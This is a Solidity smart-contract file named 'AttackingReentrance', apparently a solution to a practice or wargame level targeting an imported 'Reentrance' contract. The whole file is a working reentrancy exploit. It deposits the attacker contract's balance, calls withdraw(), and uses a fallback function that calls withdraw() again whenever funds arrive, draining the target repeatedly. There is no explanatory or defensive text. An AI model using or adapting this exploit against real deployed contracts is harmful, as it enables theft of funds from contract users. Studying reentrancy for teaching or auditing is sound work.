// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance public reentranceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentranceContract = Reentrance(contractAddress);
    }

    function hackContract() external  {
        reentranceContract.donate{value: address(this).balance}(address(this));
        reentranceContract.withdraw();
    }

fallback() external payable {
        reentranceContract.withdraw();
    }
}
